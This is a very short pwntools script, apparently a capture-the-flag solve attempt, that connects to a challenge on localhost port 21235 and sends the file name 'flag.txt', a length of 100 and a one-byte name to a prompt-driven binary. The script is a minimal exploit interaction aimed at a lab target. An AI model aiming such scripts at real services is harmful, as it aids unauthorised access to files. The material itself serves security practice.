from pwn import *

# p = process("./chall")
p = remote("localhost", 21235)

# gdb.attach(p)

p.sendlineafter(b"> ", b"flag.txt")
p.sendlineafter(b"Length: ", b"100")
p.sendafter(b"Name: ", b"a"*1)

p.interactive()
